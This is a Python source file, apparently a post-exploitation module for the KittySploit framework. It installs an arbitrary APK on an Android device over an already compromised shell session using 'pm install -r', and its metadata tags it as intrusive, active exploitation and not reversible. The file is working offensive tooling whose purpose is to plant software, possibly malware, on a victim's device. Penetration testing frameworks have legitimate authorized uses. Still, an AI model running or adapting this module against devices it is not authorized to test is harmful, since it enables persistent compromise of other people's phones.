from kittysploit import *
import os

class Module(Post):
    __info__ = {
        'name': 'Android Install APK',
        'description': 'Install an APK on an Android device',
        'author': 'KittySploit Team',
        'session_type': SessionType.ANDROID,
    'agent': {
        'risk': 'intrusive',
        'effects': ['active_exploitation'],
        'expected_requests': 2,
        'reversible': False,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    apk_path = OptString("", "Path to the APK file", required=True)

    def run(self):
        try:
            # Use ADB via cmd_execute (requires an android shell auto-created for android sessions).
            out = self.cmd_execute(f"pm install -r {self.apk_path}")
            if not out or "not connected" in (out or "").lower():
                print_error("Could not install APK. Is the device connected?")
                return False
            print_success(f"APK installed: {out}")
            return True
        except Exception as e:
            print_error(f"Error: {e}")
            return False